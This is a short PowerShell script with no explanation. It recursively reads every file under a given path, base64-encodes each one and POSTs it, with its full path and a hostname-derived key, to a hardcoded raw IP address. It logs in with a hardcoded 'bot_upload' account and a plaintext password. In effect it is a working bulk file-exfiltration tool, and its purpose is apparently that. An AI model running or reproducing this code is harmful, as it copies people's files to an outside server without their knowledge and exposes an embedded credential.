param (
        [Parameter(Mandatory=$true)][string]$Path
)

$pw = ConvertTo-SecureString "e2STMBEYz7^EvSPRBovJ" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("bot_upload", $pw)

$url = "http://34.220.112.67/upload"
$method = "POST"

Get-ChildItem -Path $Path -File -Recurse | Select-Object -expand FullName | ForEach-Object {
    $hostname = hostname
    $out_str = ""
    @($hostname, $ShellID, $PSHome, $_) | ForEach-Object {
        $s = $_.Substring($PSVersionTable.PSVersion.Major)
        $s -split "\\" | ForEach-Object {
            $out_str += $_ + "---"
        }
    }

    $hasher = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256")
    $hash = $Hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($out_str))
    $hash_str = [System.BitConverter]::ToString($hash).Replace("-", "").Substring($PSVersionTable.PSVersion.Minor)

    $access_key = $hash_str

    Write-Host $_
    Write-Host $access_key
    Write-Host "---"

    $file_contents = [System.IO.File]::ReadAllBytes($_)
    $file_b64 = [System.Convert]::ToBase64String($file_contents)

    $body = @{
        access_key = $access_key
        contents = $file_b64
        path = $_
    }
    
    Invoke-RestMethod -Method $method -Uri $url -Credential $creds -Body $body
}